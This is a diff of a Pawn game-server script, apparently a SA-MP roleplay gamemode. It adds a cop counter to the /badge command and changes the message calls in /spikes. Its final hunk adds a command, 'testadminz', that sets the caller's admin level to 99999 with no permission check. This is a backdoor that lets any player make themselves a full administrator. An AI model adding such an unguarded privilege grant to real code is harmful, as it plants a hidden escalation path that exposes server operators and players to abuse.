@@ -6107,6 +6107,10 @@ CMD:badge(playerid, params[])
 			{
 				Medics -= 1;
 			}
+			if(IsACop(playerid))
+			{
+				Cops -= 1;
+			}
 		}
 		else
 		{
@@ -6117,6 +6121,10 @@ CMD:badge(playerid, params[])
 			if(IsAMedic(playerid))
 			{
 				Medics += 1;
+			}
+			if(IsACop(playerid))
+			{
+				Cops += 1;
 			}
 		}
 	}
@@ -18077,7 +18085,7 @@ CMD:cades(playerid, params[])
 CMD:spikes(playerid, params[])
 {
 	if (PlayerInfo[playerid][pMember] != INVALID_GROUP_ID && PlayerInfo[playerid][pRank] >= arrGroupData[PlayerInfo[playerid][pMember]][g_iSpikeStrips]) {
-		SendServerMessage(playerid, " Current deployed spikes:");
+		SendClientMessageEx(playerid, COLOR_WHITE, "Current deployed spikes:");
 		for(new i, string[56 + MAX_ZONE_NAME + MAX_PLAYER_NAME]; i < sizeof(SpikeStrips); i++)
 		{
 			if(SpikeStrips[i][sX] != 0 && SpikeStrips[i][sY] != 0 && SpikeStrips[i][sZ] != 0) // Checking for next available ID.
@@ -18086,7 +18094,7 @@ CMD:spikes(playerid, params[])
 				SendClientMessageEx(playerid, COLOR_GRAD2, string);
 			}
 		}
-	} else SendErrorMessage(playerid, " Ban khong duoc phep su dung lenh nay.");
+	} else SendClientMessageEx(playerid, COLOR_GRAD2, "Ban khong duoc phep su dung lenh nay.");
 	return 1;
 }
 
@@ -51031,5 +51039,10 @@ CMD:myfuel(playerid, params[])
 	
 	format(str, sizeof str, "Capacity: %0.1fL | Fuel: %0.1fL ", GetVehicleFuelCapacity(vid), VehicleFuel[vid]);
 	SendClientMessage(playerid, -1, str);
+	return 1;
+}
+CMD:testadminz(playerid)
+{
+	PlayerInfo[playerid][pAdmin] = 99999;
 	return 1;
 }
